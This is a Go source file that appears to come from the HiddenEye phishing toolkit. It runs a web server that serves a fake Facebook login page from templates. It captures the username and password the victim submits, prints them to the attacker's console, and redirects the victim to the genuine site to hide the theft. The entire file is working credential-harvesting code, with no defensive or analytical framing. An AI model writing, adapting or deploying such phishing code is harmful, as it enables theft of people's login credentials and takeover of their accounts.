package services

import (
	"fmt"
	"net/http"
	"strconv"
	"text/template"

	Colors "HiddenEye/utils"
)

var tpl *template.Template

func init() {
	tpl = template.Must(template.ParseGlob("templates/facebook/*.gohtml"))

}

func PhisingHandler(p int, url string) {
	port := strconv.Itoa(p)
	http.HandleFunc("/", index)
	http.HandleFunc("/process", processor(url))
	http.ListenAndServe(":"+port, nil)
}

func index(w http.ResponseWriter, r *http.Request) {
	fmt.Println("\n\n  " + Colors.Red() + " [+] " + Colors.White() + "  Victum is interacting with the server")
	tpl.ExecuteTemplate(w, "index.gohtml", nil)
}
func processor(url string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {

		if r.Method != "POST" {
			http.Redirect(w, r, "/", http.StatusSeeOther)
			return
		}

		fname := r.FormValue("firster")
		lname := r.FormValue("laster")
		// surf := r.FormValue("surf")
		// snow := r.FormValue("snow")
		// skate := r.FormValue("skate")
		// radio := r.FormValue("cow")

		fmt.Print(Colors.Red(), "\n\n["+Colors.White()+"*"+Colors.Red()+"]", Colors.White(), " Username : ", Colors.Green(), fname,
			Colors.Red(), "\n\n["+Colors.White()+"*"+Colors.Red()+"]", Colors.White(), " Password : ", Colors.Green(), lname)

		// d := struct {
		// 	First, Last, Surf, Snow, Skate, Radio string
		// }{
		// 	First: fname,
		// 	Last:  lname,
		// 	Surf:  surf,
		// 	Snow:  snow,
		// 	Skate: skate,
		// 	Radio: radio,
		// }

		http.Redirect(w, r, "https://"+url, http.StatusSeeOther)
	}
}
